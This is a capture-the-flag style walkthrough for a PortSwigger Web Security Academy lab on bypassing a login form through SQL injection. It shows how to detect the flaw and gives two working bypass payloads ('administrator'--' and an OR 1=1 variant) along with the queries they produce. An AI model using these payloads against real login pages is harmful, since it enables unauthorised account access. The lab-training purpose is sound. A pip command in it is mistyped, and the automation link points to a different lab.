\+ Lab #2    : SQL injection allowing login bypass\
\+ Lab Level : Apprentice\
\+ Link      : https://portswigger.net/web-security/sql-injection/lab-login-bypass \


## About:
This lab contains a [SQL injection](https://portswigger.net/web-security/sql-injection) in the login functionality.<br/>
To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user. 

## End Goal:
Bypassing the login functionality and loging in as the ```administrator``` user

## Detection: 
* Navigate to the ```/login``` directory and you will be presented with the vulnerable login functionality<br/>
* Since we know that this login form is vulnerable to SQLi, let's try triggering an error by submitting a single quote ```'``` in the ```username``` field and some random password in the password field.
* The App should return a ```500 Internal Server Error```, which means that an error has occured in the back-end database while processing the query.
* The ```username``` POST parameter is vulnerable to SQL Injection !

## Exploitation: 
### Manual: 
1. Intercept the request with Burp Suite proxy,
2. Send the request to repeater,
3. Inject the username field with the following payload: ```administrator'--```
4. The resulting query sent by the App to the back-end database should look to something like this:
```SQL
SELECT * FROM content WHERE username='administrator'--' AND password='p@$$w0rd'
SELECT * FROM content WHERE username='administrator'
```
> :memo: **Note:** You can also try the following payload ```randomusername' OR 1=1--``` which is also valid and bypasses the login functionality
```SQL
SELECT * FROM content WHERE username='randomusername' OR 1=1--' AND password='p@$$w0rd'
```
### Automated: 
* Refer to https://github.com/YounesTasra-R4z3rSw0rd/Web-Security-Academy/blob/main/SQL%20Injection/Lab%231/Lab-1.py
* Requirements:
```bash
pip3 install -m requirements.txt
```
